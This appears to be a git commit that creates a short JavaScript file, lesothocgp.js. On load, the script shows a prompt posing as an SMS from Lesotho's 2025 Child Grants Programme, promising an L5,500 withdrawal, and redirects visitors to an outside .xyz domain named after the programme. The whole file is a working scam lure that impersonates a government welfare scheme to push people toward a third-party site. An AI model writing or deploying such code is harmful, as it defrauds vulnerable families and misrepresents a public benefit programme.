6647b812f13276f5ad45d3f7825c86376842c1b1
bigetijazz28 <bigetijazz28@gmail.com>
2025-09-03 16:05:29 +0100

    Create lesothocgp.js

---
+++ lesothocgp.js
@@ -0,0 +1,6 @@
+
+var password = 'Withdraw L5,500'
+password=prompt('CGP SMS: Welcome to Lesotho L5,500 Child Grants Programme (CGP) 2025, press OK to apply for this amazing offer','Withdraw L5,500');
+if (password != 'Withdraw L5,500') {
+location.href='https://www.ekuula.xyz/L5500-Child-Support-Program';
+}
